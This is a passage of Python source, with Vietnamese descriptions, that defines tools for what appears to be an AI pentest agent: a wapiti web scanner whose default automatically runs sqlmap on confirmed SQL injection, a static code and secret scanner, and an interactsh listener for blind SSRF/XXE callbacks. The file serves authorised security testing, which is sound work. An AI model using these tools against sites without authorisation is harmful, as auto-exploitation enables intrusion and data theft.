                  "url": {"type": "string", "pattern": "^https?://",
                          "description": "URL gốc website cần quét (VD http://target/) — scope=domain để quét cả site"},
                  "scope": {"type": "string",
                            "enum": ["url", "page", "folder", "subdomain", "domain", "punk"],
                            "description": "Phạm vi crawl; mặc định domain (toàn bộ website)"},
                  "modules": {"type": "string",
                              "description": "Module wapiti phân tách dấu phẩy/space (vd 'sql,xss'); bỏ trống = cả 29 module"},
                  "depth": {"type": "integer", "minimum": 1, "maximum": 10,
                            "description": "Độ sâu crawl (mặc định 3)"},
                  "max_scan_time": {"type": "integer", "minimum": 30, "maximum": 1800,
                                    "description": "Giây tối đa pha scan (mặc định 300)"},
                  "max_attack_time": {"type": "integer", "minimum": 15,
                                      "description": "Giây tối đa mỗi module attack (mặc định 150; tự giới hạn ≤ scan_time/2)"},
                  "tasks": {"type": "integer", "minimum": 1, "maximum": 8,
                            "description": "Số task song song (mặc định 3)"},
                  "timeout": {"type": "integer", "minimum": 5, "maximum": 30,
                              "description": "Request timeout giây (mặc định 10)"},
                  "exploit": {"type": "boolean",
                              "description": "true (mặc định): SQLi CONFIRMED tự chạy sqlmap_runner"},
                  "cookie": {"type": "string",
                             "description": "Cookie phiên cho vùng cần đăng nhập (VD 'PHPSESSID=x;...')"},
                  "skipped_parameters": {"type": "string",
                                         "description": "Override param bị --skip (phân tách phẩy, vd 'page,offset'); mặc định skip page/p/offset/limit/...; truyền chuỗi rỗng để tắt skip"},
              },
              "required": ["url"]},
             _wapiti_scan, risk="noisy"),

    # ── SAST ──
    ToolSpec("sast_scan",
             "Quét static source code (file/thư mục local) tìm lỗ hổng & secret bằng pattern "
             "cho PHP/Python/JS/Java; secret scan chạy trên mọi file. "
             "engine=patterns (mặc định, không cần cài gì) | semgrep | gitleaks | auto. "
             "Kết quả là heuristic — phải xác minh thủ công.",
             {"type": "object",
              "properties": {
                  "src_path": {"type": "string",
                                "description": "Thư mục hoặc file source (phải nằm trong WEBX_SRC_DIRS)"},
                  "languages": {"type": "array", "items": {"type": "string",
                              "enum": ["php", "python", "javascript", "java"]},
                                "description": "Giới hạn pattern theo ngôn ngữ; secret vẫn quét mọi file"},
                  "max_findings": {"type": "integer", "minimum": 1, "maximum": 1000},
                  "engine": {"type": "string",
                              "enum": ["patterns", "semgrep", "gitleaks", "auto"],
                              "description": "patterns=builtin; semgrep/gitleaks cần binary; auto=patterns + engines nếu có"}},
              "required": ["src_path"]},
             _sast_scan, scope_params=("src_path",), risk="safe"),

    # ── OOB ──
    ToolSpec("oob_listener", "Chạy interactsh-client nền ~10s để nhận callback OOB "
             "(blind SSRF/XXE). Trả về log path; callback xuất hiện bất đồng bộ.",
             {"type": "object", "properties": {}}, _oob_interactsh, risk="noisy"),
]
TOOL_INDEX = {t.name: t for t in TOOL_REGISTRY}
